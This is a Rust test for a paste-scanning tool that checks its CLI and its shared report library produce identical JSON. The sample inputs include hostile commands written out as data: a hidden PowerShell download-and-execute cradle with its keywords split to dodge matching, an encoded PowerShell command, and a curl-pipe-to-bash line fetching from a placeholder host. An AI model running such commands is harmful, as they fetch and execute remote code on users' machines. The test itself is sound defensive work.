//! The CLI's Report JSON and the shared `paste-warden-report` crate (used by WASM
//! and Python) must serialize identically (phase-2.md §2.2).

use paste_warden_core::{Context, Engine};

fn samples() -> Vec<String> {
    let ps = ["power", "shell"].concat();
    vec![
        "明天下午三點開會".into(),
        format!(
            "{ps} -w hidden -c \"i{}(i{} 'https://example.invalid/a.ps1')\"",
            "ex", "wr"
        ),
        format!("🔑 身分證 A123456789 卡號 4111 1111 1111 1111 {ps} -enc SQBFAFgA"),
        "pass\u{200b}word and wallet bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq".into(),
        "curl -fsSL https://example.invalid/x.sh | bash".into(),
    ]
}

#[test]
fn cli_and_shared_report_json_are_identical() {
    let engine = Engine::default();
    for locale in ["zh-TW", "en"] {
        let l10n = paste_warden_i18n::Localizer::new(locale);
        for text in samples() {
            let report = engine.analyze(&text, &Context::default());
            let cli = serde_json::to_value(paste_warden_cli::report_json::ReportJson::new(
                &report, &text, &l10n,
            ))
            .unwrap();
            let shared =
                serde_json::to_value(paste_warden_report::report_json(&text, &report, locale))
                    .unwrap();
            assert_eq!(cli, shared, "{locale}: {text:?}");
        }
    }
}
